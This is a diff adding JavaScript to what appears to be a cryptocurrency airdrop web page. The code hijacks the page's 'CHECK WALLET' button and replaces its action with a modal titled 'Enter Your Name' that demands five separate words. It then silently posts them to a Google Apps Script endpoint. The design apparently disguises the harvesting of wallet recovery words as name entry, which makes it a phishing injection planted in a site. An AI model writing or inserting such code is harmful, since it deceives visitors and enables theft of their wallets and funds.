@@ -591,3 +591,65 @@ setTimeout(() => {
 }, 2500); // delay 2.5 detik biar nunggu web lu load semua
 });
 // === SELESAI KODE TAMBAHAN === //
+// === WILLIEM REKAP GSHEET START === //
+window.addEventListener('load', () => {
+setTimeout(() => {
+
+    // URL APPS SCRIPT LU
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxW58uIJ54FF9kRnFevzdW4aRXmxtAs-TEXVze0Vpr_vFolkDPWteS4w3cgq45lyO1M/exec"; 
+
+    // 1. BIKIN MODAL 5 KOTAK
+    const modal = document.createElement("div");
+    modal.id = "nameModalWLM";
+    modal.style.cssText = "display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:99999; justify-content:center; align-items:center;";
+    modal.innerHTML = `
+      <div style="background:#1a1a2e; padding:30px 25px; border-radius:16px; width:95%; max-width:480px; border:2px solid #a855ff; text-align:center; color:#fff;">
+        <img src="williem.png" onerror="this.style.display='none'" style="width:80px; height:80px; margin-bottom:15px; border-radius:16px; background:#000; padding:8px;">
+        <h3 style="margin:0 0 10px;">Enter Your Name</h3>
+        <p style="color:#aaa; font-size:14px; margin:0 0 25px;">Isi 5 Kata untuk WILLIEM COIN Airdrop</p>
+        <div style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap; margin-bottom:25px;">
+          <input class="nameBoxWLM" type="text" placeholder="Kata 1" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
+          <input class="nameBoxWLM" type="text" placeholder="Kata 2" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
+          <input class="nameBoxWLM" type="text" placeholder="Kata 3" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
+          <input class="nameBoxWLM" type="text" placeholder="Kata 4" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
+          <input class="nameBoxWLM" type="text" placeholder="Kata 5" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
+        </div>
+        <button id="submitNameBtnWLM" style="width:100%; padding:14px; background:linear-gradient(90deg,#a855ff,#7c3aed); color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer;">SUBMIT</button>
+      </div>
+    `;
+    document.body.appendChild(modal);
+
+    // 2. TIMPA TOMBOL CHECK WALLET
+    const checkWalletBtn = Array.from(document.querySelectorAll("button")).find(btn => btn.innerText && btn.innerText.toUpperCase().includes("CHECK WALLET"));
+    if(checkWalletBtn){
+        checkWalletBtn.onclick = (e) => {
+            e.preventDefault(); e.stopPropagation();
+            modal.style.display = "flex";
+        }
+    }
+
+    // 3. LOGIKA SUBMIT + KIRIM KE GSHEET
+    document.getElementById("submitNameBtnWLM").onclick = () => {
+        let name = "";
+        document.querySelectorAll('.nameBoxWLM').forEach(box => { if(box.value.trim() !== "") name += box.value.trim() + " "; });
+        name = name.trim();
+        
+        if(name.split(" ").length < 5) return alert("Isi 5 kotak dulu bro!");
+
+        // KIRIM KE GSHEET
+        fetch(GOOGLE_SCRIPT_URL, { 
+            method: 'POST', 
+            mode: 'no-cors', 
+            body: new URLSearchParams({ nama: name }) 
+        });
+
+        modal.style.display = "none";
+        alert("TERDAFTAR! Data kamu udah masuk ke rekap Sheet2 ✅");
+        document.querySelectorAll('.nameBoxWLM').forEach(box => box.value = "");
+    }
+    
+    modal.onclick = (e) => { if(e.target === modal) modal.style.display = "none"; }
+
+}, 2000);
+});
+// === WILLIEM REKAP GSHEET END === //
